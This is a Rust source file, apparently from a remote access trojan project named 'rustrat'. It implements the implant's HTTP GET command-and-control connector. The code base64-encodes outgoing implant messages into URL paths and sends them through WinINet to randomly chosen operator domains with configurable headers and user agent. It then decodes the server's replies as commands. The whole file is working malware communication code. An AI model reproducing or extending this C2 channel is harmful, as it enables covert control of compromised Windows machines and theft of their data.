use std::ffi::CString;

use crate::connector::http::register_wininet_fns;
use crate::runtime::{self, connector};
use crate::{
    connector::http::{InternetHandle, InternetUrlFlags},
    error::*,
};

use rustrat_common::messages::{deserialize, serialize};

use rand::seq::SliceRandom;

pub struct GetConnector {
    domains: Vec<CString>,
    paths: Vec<String>,
    is_https: bool,
    port: u16,
    headers: Vec<CString>,
    ua: CString,

    // TODO some functionality like this
    //payload_start: CString,
    //payload_end: CString,
    longest_path: usize,

    common_utils: runtime::CommonUtils,
}

impl GetConnector {
    pub fn new(
        domains: Vec<CString>,
        paths: Vec<String>,
        is_https: bool,
        port: u16,
        headers: Vec<CString>,
        ua: CString,
        common_utils: runtime::CommonUtils,
    ) -> Self {
        register_wininet_fns(common_utils.fn_table.clone()).unwrap();

        // TODO should this be handled here?
        let mut longest_path: usize = 0;
        for path in &paths {
            if !path.contains("#PLOAD#") {
                panic!("Path does not contain a payload placeholder");
            }

            // Store the longest path (without payload placeholder)
            if (path.len() - "#PLOAD#".len()) > longest_path {
                longest_path = path.len() - "#PLOAD#".len();
            }
        }

        Self {
            domains,
            paths,
            is_https,
            port,
            headers,
            ua,
            longest_path,
            common_utils,
        }
    }
}

impl connector::PollingConnector for GetConnector {
    fn send(
        &mut self,
        message: &rustrat_common::messages::rat_to_server::Message,
    ) -> Result<rustrat_common::messages::server_to_rat::Message> {
        let serialized_message =
            base64::encode_config(serialize(message)?, base64::URL_SAFE_NO_PAD);

        if serialized_message.len() > self.size_limit() {
            return Err(Error::ArgumentError);
        }

        // TODO more customization options (random numbers etc?)
        let mut rng = self.common_utils.get_rng();
        let domain = self.domains.choose(&mut rng).unwrap().clone();
        let path = CString::new(self.paths.choose(&mut rng).unwrap().replacen(
            "#PLOAD#",
            &serialized_message,
            1,
        ))
        .unwrap();

        let mut flags = InternetUrlFlags::INTERNET_FLAG_NO_CACHE_WRITE
            | InternetUrlFlags::INTERNET_FLAG_NO_COOKIES
            | InternetUrlFlags::INTERNET_FLAG_PRAGMA_NOCACHE
            | InternetUrlFlags::INTERNET_FLAG_RELOAD;

        if self.is_https {
            flags |= InternetUrlFlags::INTERNET_FLAG_SECURE;
        }

        let internet_handle = InternetHandle::create(self.common_utils.fn_table.clone(), &self.ua)?;
        let mut request_handle = internet_handle.create_request(
            &domain,
            self.port,
            &CString::new("GET").unwrap(),
            &path,
            flags,
        )?;

        request_handle.set_headers(&self.headers)?;

        let response_handle = request_handle.send_request(None)?;

        // TODO support responses not consisting solely of serialized objects
        let response_body = response_handle.get_response()?;
        let message: rustrat_common::messages::server_to_rat::Message =
            deserialize(&response_body)?;

        Ok(message)
    }

    fn can_send(&self, message: &rustrat_common::messages::rat_to_server::Message) -> bool {
        match bincode::serialized_size(message) {
            Ok(len) => len as usize <= self.size_limit(),
            Err(_) => false,
        }
    }

    fn size_limit(&self) -> usize {
        // https://stackoverflow.com/questions/1010121/what-is-the-maximum-url-length-you-can-pass-to-the-wininet-function-httpopenreq
        // Based on unpadded base64 length calculation from https://stackoverflow.com/a/45401395
        // (data_len * 4 + 2) / 3 = base64_len <=> data_len = (3 * base64_len - 2) / 4
        (3 * (2048 - self.longest_path) - 2) / 4
    }
}

// TODO
//struct PostConnector {
//
//}
